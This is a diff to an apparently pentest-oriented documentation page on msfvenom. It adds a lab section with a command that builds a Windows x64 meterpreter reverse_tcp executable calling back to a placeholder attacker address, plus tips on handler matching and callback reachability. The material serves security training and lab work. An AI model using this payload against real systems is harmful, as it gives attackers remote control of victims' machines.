@@ -7,7 +7,37 @@ boost: 10
 hideFooterPagination: true
 ---
 
+import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+
 {/* Generated from Commands/msfvenom.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+
+## Current operation: Generate a Windows lab payload with explicit callback settings
+
+**Run in:** Kali. **Requires:** An x64 Windows lab target, a reachable callback address and a matching handler planned on Kali; this command generates a file only.
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o lab-payload.exe
+```
+
+**Read the result:** Match payload platform, architecture, staged/stageless choice, output format and handler configuration.
+
+**If Generation succeeds but execution produces no session:** LHOST must be reachable from the target. Producing a file does not prove it runs on the target or matches the receiving handler.
+
+**Next check:** Check architecture, execution path, endpoint policy, callback route and handler payload type independently.
+
+**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
+
+### Reviewed operation documentation
+
+- [Primary reference 1](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
+
+## Preserved earlier notes
+
+<PreservedNotes>
+
+Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
 
 ## msfvenom: choose the operation and read the result
 
@@ -385,3 +415,5 @@ Final size of dll file: 8704 bytes
 - [Shells, Payloads, and Interactive TTYs](/exploitation/shells-payloads-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
+
+</PreservedNotes>
